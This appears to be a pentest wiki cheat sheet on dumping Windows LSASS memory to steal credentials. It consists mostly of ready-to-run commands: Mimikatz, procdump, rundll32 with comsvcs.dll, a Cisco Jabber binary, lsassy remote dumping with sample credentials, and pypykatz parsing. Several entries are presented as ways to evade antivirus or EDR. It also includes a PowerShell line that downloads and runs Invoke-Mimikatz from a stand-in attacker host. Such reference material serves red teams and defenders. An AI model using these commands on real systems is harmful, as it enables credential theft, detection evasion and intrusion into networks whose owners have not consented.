---
icon: diamond-half
---

# LSASS Dumping

LSASS (Local Security Authority Subsystem Service) stores credentials in memory — plaintext passwords, NTLM hashes, Kerberos tickets. Dumping it gives you everything.

**Requirement:** Admin / SYSTEM / SeDebugPrivilege

***

### Mimikatz (Windows)

```powershell
# Direct dump — most detected
.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Load from minidump file
.\\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# In-memory via PowerShell (no disk drop)
IEX (New-Object Net.WebClient).DownloadString('<http://attacker/Invoke-Mimikatz.ps1>')
Invoke-Mimikatz -DumpCreds
```

***

### Task Manager (Windows)

No tools needed — GUI method.

```
Task Manager → Details tab → Right-click lsass.exe → Create dump file
# Saved to: C:\\Users\\ADMIN\\AppData\\Local\\Temp\\lsass.DMP
```

Then load in mimikatz:

```powershell
.\\mimikatz.exe "sekurlsa::minidump C:\\temp\\lsass.DMP" "sekurlsa::logonpasswords" "exit"
```

***

### ProcDump (Windows) — Least detected by Defender

```bash
# Standard dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Clone method — avoids reading lsass directly (bypasses some EDR)
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

Parse on Linux:

```bash
pypykatz lsa minidump lsass.dmp
```

***

### comsvcs.dll via rundll32 (Windows LOLBin)

No extra tools — uses built-in Windows DLL.

```bash
# Get lsass PID first
tasklist | findstr lsass

# Dump using comsvcs.dll
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\temp\\lsass.dmp full
```

Parse on Linux:

```bash
pypykatz lsa minidump lsass.dmp
```

***

### MiniDumpWriteDump Custom Tool (Windows)

Custom C++ binary that calls `MiniDumpWriteDump` API — bypasses AV that flags mimikatz by name.

```bash
.\\CreateMiniDump.exe
# Output: lsass.dmp in current directory
```

Parse on Linux:

```bash
pypykatz lsa minidump lsass.dmp
```

***

### PssCaptureSnapshot (Windows — EDR bypass)

Dumps lsass via process snapshot instead of direct memory read — `procdump -r` uses this internally.

```bash
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

Custom code approach — `PssCaptureSnapshot()` → `MiniDumpWriteDump()` on snapshot handle instead of lsass handle.

***

### Cisco Jabber ProcessDump.exe (Windows LOLBin)

If Cisco Jabber is installed:

```powershell
cd "C:\\Program Files (x86)\\Cisco Systems\\Cisco Jabber\\x64\\"
processdump.exe (ps lsass).id C:\\temp\\lsass.dmp
```

***

### lsassy (Linux — Remote)

Dump and parse LSASS remotely without touching disk.

```bash
# With password
lsassy -d corp.local -u john -p Password123 192.168.1.20

# With hash
lsassy -d corp.local -u john -H NTLMHASH 192.168.1.20

# Via nxc module
nxc smb 192.168.1.20 -u john -p Password123 -M lsassy
```

***

### pypykatz (Linux — Parse offline dump)

```bash
# Parse lsass dump
pypykatz lsa minidump lsass.dmp

# Parse from registry hives
pypykatz registry --sam SAM --system SYSTEM --security SECURITY
```

***

